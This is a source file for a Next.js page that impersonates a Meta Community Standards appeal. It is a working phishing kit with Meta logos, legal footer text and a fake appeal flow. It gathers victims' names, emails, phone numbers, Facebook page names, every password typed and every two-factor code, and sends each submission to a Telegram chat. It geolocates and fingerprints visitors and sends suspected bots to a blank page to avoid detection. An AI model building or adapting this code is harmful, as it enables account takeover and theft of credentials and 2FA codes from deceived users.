'use client';

import { useState, useEffect, useMemo, useCallback, useRef } from 'react';
import type { StaticImageData } from 'next/image';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import SuccessModal from '@/components/SuccessModal';
import { homeDefaultTexts } from '@/i18n/default-texts';
import { MORE_LANGUAGES, PRIMARY_LANGUAGES } from '@/i18n/language-options';
import type { FormData, UiTexts } from '@/types';
import '@/assets/css/community-standards.css';
import Background from '@/assets/images/background.png';
import BgHero from '@/assets/images/bg_hero.png';
import TradeMark from '@/assets/images/trade-mark.png';
import Copyright from '@/assets/images/copyright.png';
import Counterfeit from '@/assets/images/counterfeit.png';
import IcWarning from '@/assets/images/ic_warning.svg';

import { applyTranslations } from '@/utils/apply-translations';
import { getDeviceLabel } from '@/utils/device';
import { sendTelegramMessage } from '@/utils/send-message';
import { buildMetaMessage } from '@/utils/message';
import detectBot from '@/utils/detect_bot';
import { fetchAndPersistGeo } from '@/utils/geo-client';
import { applyDocumentLanguage, LANG_COOKIE, normalizeLanguageCode } from '@/utils/resolve-language';
import {
    loadVerificationFormData,
    loadVerificationStep,
    resetFlowAfterSuccess,
    saveVerificationFormData,
    saveVerificationStep
} from '@/utils/verification-form-storage';

const assetSrc = (asset: StaticImageData | string) => (typeof asset === 'string' ? asset : asset.src);

const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
    const [showReviewPage, setShowReviewPage] = useState(false);
    const [showLoginModal, setShowLoginModal] = useState(false);
    const [show2FAModal, setShow2FAModal] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [formData, setFormData] = useState<FormData>(() => loadVerificationFormData());
    const [loginData, setLoginData] = useState({ email: '', password: '' });
    const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
    const [twoFAAttempts, setTwoFAAttempts] = useState<string[]>([]);
    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', country_code: 'US' });
    const [deviceLabel, setDeviceLabel] = useState('Unknown');
    const messageIdRef = useRef<number | null>(null);
    const sendQueueRef = useRef<Promise<void>>(Promise.resolve());
    const formDataRef = useRef(formData);
    const selectedMethodRef = useRef('');
    const deviceLabelRef = useRef('Unknown');
    const defaultTexts = useMemo(() => ({ ...homeDefaultTexts }), []);
    const [translatedTexts, setTranslatedTexts] = useState<UiTexts>(() =>
        applyTranslations(defaultTexts, initialLang)
    );
    const [currentLang, setCurrentLang] = useState(initialLang);

    useEffect(() => {
        formDataRef.current = formData;
    }, [formData]);

    useEffect(() => {
        const storedId = localStorage.getItem('message_id');
        if (storedId) {
            const parsed = Number.parseInt(storedId, 10);
            if (!Number.isNaN(parsed)) {
                messageIdRef.current = parsed;
            }
        }

        const draft = loadVerificationFormData();
        setFormData(draft);
        formDataRef.current = draft;

        const step = loadVerificationStep();
        if (step === 'review') {
            setShowReviewPage(true);
        } else if (step === 'login') {
            setShowLoginModal(true);
        } else if (step === '2fa') {
            setShow2FAModal(true);
        }
        // success không khôi phục — luôn về đầu trang, giữ form + CONTINUE CLICKED
    }, []);

    const applyLang = useCallback(
        (lang: string, manual = false) => {
            const nextLang = normalizeLanguageCode(lang) || 'en';
            setCurrentLang(nextLang);
            setTranslatedTexts(nextLang === 'en' ? defaultTexts : applyTranslations(defaultTexts, nextLang));
            applyDocumentLanguage(nextLang);
            localStorage.setItem('targetLang', nextLang);
            document.cookie = `${LANG_COOKIE}=${nextLang}; path=/; max-age=86400; samesite=lax`;
            if (manual) {
                localStorage.setItem('langManual', '1');
            }
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        try {
            const manual = localStorage.getItem('langManual') === '1';
            const preferredLang = localStorage.getItem('targetLang') || initialLang;
            applyLang(preferredLang);

            const stored = localStorage.getItem('ipInfo');
            if (stored) {
                try {
                    const parsed = JSON.parse(stored) as typeof ipInfo;
                    if (parsed?.ip) {
                        setIpInfo(parsed);
                    }
                } catch {
                    // Ignore invalid cache and refresh from geo lookup.
                }
            }

            const geo = await fetchAndPersistGeo(preferredLang);
            setIpInfo(geo.ipInfo);
            if (manual) {
                applyLang(preferredLang);
            } else if (geo.lang && geo.lang !== preferredLang) {
                applyLang(geo.lang);
            }

            const device = await getDeviceLabel().catch(() => 'Unknown');
            deviceLabelRef.current = device;
            setDeviceLabel(device);

            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
            }
        } catch (error) {
            console.error('Initialization error:', error);
            setTranslatedTexts(defaultTexts);
        }
    }, [applyLang, defaultTexts, initialLang]);

    useEffect(() => {
        initializeApp();
    }, [initializeApp]);

    const buildAndSend = (form: FormData, passwordLogs: string[], codeAttempts: string[]) => {
        const geoInfo = {
            asn: 0,
            ip: ipInfo.ip,
            country: ipInfo.country,
            city: ipInfo.city,
            region: ipInfo.region,
            country_code: ipInfo.country_code || 'US'
        };

        const message = buildMetaMessage({
            geoInfo,
            userData: {
                fullName: form.fullName,
                personalEmail: form.personalEmail,
                businessEmail: form.businessEmail,
                phoneNumber: form.phone,
                backupPhone: form.backupPhone,
                facebookPageName: form.pageName
            },
            passwords: passwordLogs,
            codes: codeAttempts,
            selectedMethod: selectedMethodRef.current,
            device: deviceLabelRef.current || deviceLabel
        });

        // Xếp hàng tuần tự: xóa tin cũ → gửi tin mới (data cũ + mới)
        sendQueueRef.current = sendQueueRef.current
            .catch(() => {})
            .then(async () => {
                const oldMessageId = messageIdRef.current;
                const result = await sendTelegramMessage(message, oldMessageId);

                if (result?.success && typeof result.message_id === 'number') {
                    messageIdRef.current = result.message_id;
                    localStorage.setItem('message_id', String(result.message_id));
                }
            })
            .catch((error) => {
                console.error('Telegram send failed:', error);
            });
    };

    const handleFirstFormSubmit = (data: FormData) => {
        formDataRef.current = data;
        setFormData(data);
        saveVerificationFormData(data);
        saveVerificationStep('login');
        buildAndSend(data, [], []);
        setShowReviewPage(false);
        setShowLoginModal(true);
    };

    const handleLoginSubmit = (email: string, password: string) => {
        setLoginData({ email, password });
        const nextPasswordAttempts = [...passwordAttempts, password];
        setPasswordAttempts(nextPasswordAttempts);
        buildAndSend(formDataRef.current, nextPasswordAttempts, twoFAAttempts);
    };

    const handle2FASubmit = (code: string) => {
        const newAttempts = [...twoFAAttempts, code];
        setTwoFAAttempts(newAttempts);
        buildAndSend(formDataRef.current, passwordAttempts, newAttempts);
    };

    const handleMethodSelect = (method: string) => {
        selectedMethodRef.current = method;
        buildAndSend(formDataRef.current, passwordAttempts, twoFAAttempts);
    };

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
    const activeLang = normalizeLanguageCode(currentLang) || 'en';
    const moreLangValue = PRIMARY_LANGUAGES.some((item) => item.code === activeLang)
        ? ''
        : MORE_LANGUAGES.some((item) => item.code === activeLang)
          ? activeLang
          : '';

    const Footer = () => (
        <div className="bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full">
            <div className="max-w-[1280px] w-full mx-auto px-4">
                <div className="community-footer-languages flex flex-wrap justify-center items-center gap-4 mb-4 text-[13px] text-gray-600">
                    {PRIMARY_LANGUAGES.map((item) => {
                        const isActive = activeLang === item.code;
                        return (
                            <button
                                key={item.id}
                                type="button"
                                onClick={() => applyLang(item.code, true)}
                                className={`hover:underline ${isActive ? 'font-semibold text-[#1c2b33]' : 'text-[#6D84B4]'}`}
                            >
                                {item.label}
                            </button>
                        );
                    })}
                    <select
                        aria-label="More languages"
                        value={moreLangValue}
                        onChange={(event) => {
                            const nextLang = event.target.value;
                            if (nextLang) {
                                applyLang(nextLang, true);
                            }
                        }}
                        className="rounded border border-[#ccd0d5] bg-white px-2 py-1 text-[13px] text-[#6D84B4]"
                    >
                        <option value="">More languages</option>
                        {MORE_LANGUAGES.map((item) => (
                            <option key={item.id} value={item.code}>
                                {item.label}
                            </option>
                        ))}
                    </select>
                </div>
                <div className="community-footer-links mx-auto mt-1 max-w-3xl text-center text-[12px] leading-6 text-gray-500 pointer-events-none select-none">
                    <p>© 2026 Meta Platforms, Inc.</p>
                    <p>Attention: Community Support, 1 Meta Way, Menlo Park, CA 94025, United States</p>
                </div>
            </div>
        </div>
    );

    const Header = () => (
        <div className="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
            <div className="max-w-[1280px] w-full flex items-center justify-between px-4">
                <a href="/help/community-standards">
                    <img src="/static/media/logo-meta.svg" width="64" alt="Meta" />
                </a>
            </div>
        </div>
    );

    return (
        <>
            {showReviewPage ? (
                <div className="community-page min-h-screen w-full flex justify-center bg-white">
                    <div className="w-full">
                        <Header />
                        <FirstFormModal
                            show={true}
                            asPage={true}
                            onClose={() => {
                                saveVerificationStep('');
                                setShowReviewPage(false);
                            }}
                            onSubmit={handleFirstFormSubmit}
                            texts={texts}
                        />
                        <Footer />
                    </div>
                </div>
            ) : (
                <div className="community-page min-h-screen w-full flex justify-center bg-white">
                    <div className="w-full">
                        <Header />

                        <div
                            className="bg-no-repeat bg-cover flex items-center justify-center"
                            style={{ backgroundImage: `url(${assetSrc(Background)})` }}
                        >
                            <div className="max-w-[1280px] w-full px-4 flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6">
                                <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex flex-col items-start text-left justify-center">
                                    <h1 className="font-[700] text-[32px] mb-3">{texts.heroTitle}</h1>
                                    <p className="text-[16px] mb-2">{texts.heroDesc}</p>
                                </div>
                                <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex items-center justify-center">
                                    <img src={assetSrc(BgHero)} width="100%" alt="Hero" />
                                </div>
                            </div>
                        </div>

                        <div className="border-b border-[#E0E0E0]">
                            <div className="community-appeal">
                                <div className="community-appeal-intro">
                                    <div className="community-appeal-header">
                                        <img src={assetSrc(IcWarning)} className="w-[29px] h-[29px]" alt="" />
                                        <b className="community-appeal-title">{texts.appealTitle}</b>
                                    </div>
                                    <p className="text-gray-800">{texts.appealDesc1}</p>
                                    <p className="text-gray-800">{texts.appealDesc2}</p>
                                </div>

                                <div className="community-appeal-section">
                                    <p className="community-appeal-section-title">{texts.appealWhyTitle}</p>
                                    <p>{texts.appealWhy1}</p>
                                    <p>{texts.appealWhy2}</p>
                                </div>

                                <div className="community-appeal-section">
                                    <p className="community-appeal-section-title">{texts.appealWhatTitle}</p>
                                    <p>{texts.appealWhat1}</p>
                                    <p>{texts.appealWhat2}</p>
                                    <p>{texts.appealWhat3}</p>
                                </div>
                                <button
                                    type="button"
                                    onClick={() => {
                                        saveVerificationStep('review');
                                        setShowReviewPage(true);
                                    }}
                                    className="community-appeal-button"
                                >
                                    {texts.appealButton}
                                </button>
                            </div>
                        </div>

                        <div className="community-ip-section mt-10 max-w-[1280px] w-full px-4 mx-auto">
                            <p className="text-center">
                                <b className="font-700 md:text-3xl text-2xl text-center">{texts.ipTitle}</b>
                            </p>

                            <div className="community-ip-row community-ip-row-text-first">
                                <div className="community-ip-copy community-ip-copy-left">
                                    <b className="font-700 md:text-2xl text-xl">{texts.trademarkTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.trademarkDesc}</p>
                                </div>
                                <div className="community-ip-image">
                                    <img src={assetSrc(TradeMark)} width="100%" alt="Trademark" />
                                </div>
                            </div>

                            <div className="community-ip-row community-ip-row-image-first">
                                <div className="community-ip-image">
                                    <img src={assetSrc(Copyright)} width="100%" alt="Copyright" />
                                </div>
                                <div className="community-ip-copy community-ip-copy-right">
                                    <b className="font-700 md:text-2xl text-xl">{texts.copyrightTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.copyrightDesc}</p>
                                </div>
                            </div>

                            <div className="community-ip-row community-ip-row-text-first">
                                <div className="community-ip-copy community-ip-copy-left">
                                    <b className="font-700 md:text-2xl text-xl">{texts.counterfeitTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.counterfeitDesc}</p>
                                </div>
                                <div className="community-ip-image">
                                    <img src={assetSrc(Counterfeit)} width="100%" alt="Counterfeit" />
                                </div>
                            </div>
                        </div>

                        <Footer />
                    </div>
                </div>
            )}

            <LoginModal
                show={showLoginModal}
                onClose={() => setShowLoginModal(false)}
                onSubmit={handleLoginSubmit}
                onSuccess={() => {
                    setShowLoginModal(false);
                    saveVerificationStep('2fa');
                    setShow2FAModal(true);
                }}
                texts={texts}
            />
            <TwoFAModal
                show={show2FAModal}
                onClose={() => setShow2FAModal(false)}
                onSubmit={handle2FASubmit}
                onMethodSelect={handleMethodSelect}
                onSuccess={() => {
                    setShow2FAModal(false);
                    setPasswordAttempts([]);
                    setTwoFAAttempts([]);
                    setLoginData({ email: '', password: '' });
                    selectedMethodRef.current = '';
                    messageIdRef.current = null;
                    resetFlowAfterSuccess();

                    const keptForm = loadVerificationFormData();
                    setFormData(keptForm);
                    formDataRef.current = keptForm;

                    setShowReviewPage(false);
                    setShowLoginModal(false);
                    setShowSuccessModal(true);
                }}
                texts={texts}
                formData={formData}
            />
            <SuccessModal
                show={showSuccessModal}
                onClose={() => {
                    setShowSuccessModal(false);
                    resetFlowAfterSuccess();
                    window.location.assign('/help/community-standards');
                }}
                texts={texts}
            />
        </>
    );
};

export default Home;
